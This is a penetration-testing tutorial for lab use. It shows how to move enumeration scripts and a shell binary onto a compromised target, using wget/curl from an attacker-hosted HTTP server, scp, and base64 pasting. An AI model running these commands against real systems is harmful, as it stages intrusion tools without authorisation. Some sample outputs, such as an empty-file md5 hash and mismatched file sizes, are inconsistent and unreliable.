During any `penetration testing` exercise, it is likely that we will need to transfer files to the remote server, such as `enumeration scripts` or `exploits`, or transfer data back to our attack host. While tools like `Metasploit` with a `Meterpreter` shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard `reverse shell`.

---

# wget


One straightforward approach is to run a `Python HTTP server` on your attack host and pull files from the target with `wget` or `cURL` from a `reverse shell`. Change into the directory containing the file and start the server with `cd /tmp` then `python3 -m http.server 8000` — this serves files on `http://0.0.0.0:8000/`.

Fetch the file from the remote system using `wget http://10.10.14.1:8000/linenum.sh` which will save `linenum.sh` locally on the target (output shows the transfer and saved file). If the target lacks `wget`, use `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` instead. Remember to replace `10.10.14.1` and `8000` with your attack-host IP and chosen port.

```bash
OathBornX@htb[/htb]$ cd /tmp
OathBornX@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

```bash
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```



---

# scp

Using `scp` requires valid `SSH` credentials and a reachable `sshd` on the target (typically `port 22`). From your attack host push a file with `scp linenum.sh user@10.10.14.5:/tmp/` or from a shell on the target pull to your host with `scp user@10.10.14.1:/home/attacker/collect.txt /tmp/`; use `-P` for a nonstandard port, `-r` for directories and `-C` to enable compression. For unattended transfers prefer `public key authentication` (create keys with `ssh-keygen` and install with `ssh-copy-id user@remotehost` or append the public key to `~/.ssh/authorized_keys`). Remember that using `scp` from a `reverse shell` requires the target to reach your host and an active `sshd` there — no wizardry, just keys and routes.

```bash
OathBornX@htb[/htb]$ scp linenum.sh user@TARGET_IP:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

---

# base64

During situations where a `firewall` blocks direct transfers over a `reverse shell`, a reliable fallback is to `base64`-encode the `binary` on your attack host, paste the resulting ASCII into the remote shell, then `decode` it back to a runnable `shell`. On your machine: `base64 -w 0 shell > shell.b64` (or `base64 shell > shell.b64` if `-w` isn’t available) to produce a single-line ASCII string you can copy. On the target create the file and paste the string (for very large files use `split` locally and concatenate remotely), then run `base64 -d shell.b64 > shell` (or `openssl base64 -d -in shell.b64 -out shell`) and `chmod +x shell` before executing. Test the file integrity with `file shell` or `md5sum`/`sha256sum` if possible — yes, it’s tedious, but it beats trying to explain to a firewall why you’re friends.

##### Attacker — encode and show for copy

```bash
# create single-line base64 and checksum
base64 -w 0 linpeas.sh > /tmp/linpeas.b64
md5sum linpeas.sh > /tmp/linpeas.md5

# display the base64 so you can copy it (it's one long line)
cat /tmp/linpeas.b64

# record the md5 value from /tmp/linpeas.md5 to compare later
cat /tmp/linpeas.md5
```

##### Target — paste (use a heredoc), decode, verify, make executable

```bash
# paste the single-line base64 string between EOF markers, then Ctrl-D
cat > /tmp/linpeas.b64 <<'EOF'
<PASTE THE SINGLE-LINE BASE64 STRING HERE>
EOF

# decode back to script
base64 -d /tmp/linpeas.b64 > /tmp/linpeas.sh

# if base64 -d is missing, use OpenSSL
# openssl base64 -d -in /tmp/linpeas.b64 -out /tmp/linpeas.sh

# make executable and verify
chmod +x /tmp/linpeas.sh
md5sum /tmp/linpeas.sh   # compare with the attacker's md5 value
file /tmp/linpeas.sh
ls -l /tmp/linpeas.sh
```

---

# Validating File Transfers

To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:

```bash
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

On your attack box run `md5sum` to record the original hash, then run `md5sum` on the transferred file on the target and compare — the two hashes must match to confirm the `ELF` wasn't corrupted.

```bash
md5sum linpeas.sh
# example output:
# d41d8cd98f00b204e9800998ecf8427e  linpeas.sh
```

```bash
md5sum /tmp/linpeas.sh
# example output:
# d41d8cd98f00b204e9800998ecf8427e  /tmp/linpeas.sh
```

If the hashes match, the transfer was successful and the `ELF` is intact.

---



